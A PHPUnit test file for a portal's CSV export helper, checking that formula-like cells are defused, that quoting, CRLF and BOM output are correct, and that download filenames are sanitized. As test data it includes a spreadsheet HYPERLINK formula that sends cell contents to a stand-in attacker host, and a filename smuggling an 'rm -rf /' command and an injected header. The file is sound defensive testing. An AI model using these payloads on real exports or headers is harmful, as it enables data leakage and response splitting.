<?php

declare(strict_types=1);

namespace Portal\Tests;

use PHPUnit\Framework\TestCase;
use Portal\Support\Csv;

/**
 * Writing CSV a spreadsheet will not execute.
 *
 * A CSV feels like the safe end of the export problem because it is a text
 * file. It is not: Excel, LibreOffice and Google Sheets all treat a cell
 * starting `=`, `+`, `-` or `@` as a formula, and a formula can reach the
 * network or — in Excel — invoke DDE, behind a warning most people click
 * through because they asked for this file and it came from their own site.
 *
 * So an export of titles an editor typed is a way to hand somebody a document
 * that attacks them. These tests are mostly about that.
 */
final class CsvTest extends TestCase
{
    // ------------------------------------------------------------- formulas

    public function testACellThatWouldBeAFormulaIsDefused(): void
    {
        foreach (['=1+1', '+1', '-1', '@SUM(A1)'] as $dangerous) {
            self::assertStringStartsWith(
                "'",
                Csv::cell($dangerous),
                $dangerous . ' would be evaluated by a spreadsheet'
            );
        }
    }

    /**
     * The one people miss. Excel strips leading whitespace BEFORE deciding
     * whether a cell is a formula, so a tab in front changes nothing.
     */
    public function testLeadingWhitespaceDoesNotHideAFormula(): void
    {
        self::assertStringStartsWith("'", Csv::cell("\t=1+1"));

        /*
         * The carriage-return case is defused AND then quoted, because a value
         * containing one has to be — so the field starts with the quote and the
         * apostrophe is inside it. Asserting on the start of the field would be
         * asserting the wrong thing; what matters is that the apostrophe is in
         * front of the content.
         */
        self::assertSame("\"'\r=1+1\"", Csv::cell("\r=1+1"));
    }

    /**
     * The real shape of the attack: a title somebody typed into the video
     * editor, which arrives in the export as the second column.
     */
    public function testATitleThatIsAFormulaIsDefusedInAWholeDocument(): void
    {
        $csv = Csv::document(
            ['Date', 'Video'],
            [['2026-08-07', '=HYPERLINK("https://evil.example/"&A1,"Click")']]
        );

        self::assertStringNotContainsString(
            ',=HYPERLINK',
            $csv,
            'the formula reached the file unescaped'
        );
        self::assertStringContainsString("'=HYPERLINK", $csv);
    }

    public function testOrdinaryTextIsLeftAlone(): void
    {
        self::assertSame('A Sermon', Csv::cell('A Sermon'));
        self::assertSame('2026-08-07', Csv::cell('2026-08-07'));
        self::assertSame('42', Csv::cell(42));
        self::assertSame('', Csv::cell(''));
    }

    /**
     * A title that legitimately begins with a minus keeps its minus. Stripping
     * the character would quietly corrupt the data the export exists to carry.
     */
    public function testADefusedValueKeepsItsOriginalText(): void
    {
        self::assertStringContainsString('-Ology', Csv::cell('-Ology'));
    }

    // -------------------------------------------------------------- quoting

    public function testValuesWithSeparatorsAreQuoted(): void
    {
        self::assertSame('"Faith, hope, love"', Csv::cell('Faith, hope, love'));
        self::assertSame('"A ""quoted"" word"', Csv::cell('A "quoted" word'));
        self::assertSame("\"Two\nlines\"", Csv::cell("Two\nlines"));
    }

    /** A defused value is still ordinary text that may contain a comma. */
    public function testADefusedValueIsAlsoQuotedWhenItNeedsToBe(): void
    {
        self::assertSame('"\'=a,b"', Csv::cell('=a,b'));
    }

    public function testARowIsCommaSeparatedAndEndsWithCrlf(): void
    {
        self::assertSame("a,b,c\r\n", Csv::row(['a', 'b', 'c']));
    }

    /** Excel on Windows reads a file with bare newlines as one long line. */
    public function testTheDocumentUsesCrlf(): void
    {
        $csv = Csv::document(['A'], [['1'], ['2']]);

        self::assertSame(3, substr_count($csv, "\r\n"));
    }

    /**
     * Without the byte order mark Excel assumes the system codepage, so a
     * speaker called "Müller" opens as "MÃ¼ller" — which reads to whoever
     * opened it as the site having mangled their data.
     */
    public function testTheDocumentStartsWithAByteOrderMark(): void
    {
        self::assertStringStartsWith("\xEF\xBB\xBF", Csv::document(['A'], []));
    }

    public function testTheHeadingRowIsPresentEvenWithNoRows(): void
    {
        self::assertStringContainsString("Date,Video\r\n", Csv::document(['Date', 'Video'], []));
    }

    // ------------------------------------------------------------ filenames

    /**
     * The filename goes into a Content-Disposition header, where a quote or a
     * newline is a response-splitting bug rather than an odd filename.
     */
    public function testAFilenameCannotBreakOutOfTheHeader(): void
    {
        $name = Csv::filename("views\"; rm -rf /\r\nX-Injected: yes");

        self::assertStringNotContainsString('"', $name);
        self::assertStringNotContainsString("\r", $name);
        self::assertStringNotContainsString("\n", $name);
        self::assertStringNotContainsString(' ', $name);
        self::assertStringEndsWith('.csv', $name);
    }

    public function testAnOrdinaryFilenameSurvives(): void
    {
        self::assertSame('views-30-days-2026-08-07.csv', Csv::filename('views-30-days', '2026-08-07'));
    }

    public function testAnEmptyNameStillProducesAFile(): void
    {
        self::assertSame('export-2026-08-07.csv', Csv::filename('', '2026-08-07'));
        self::assertSame('export-2026-08-07.csv', Csv::filename('!!!', '2026-08-07'));
    }
}
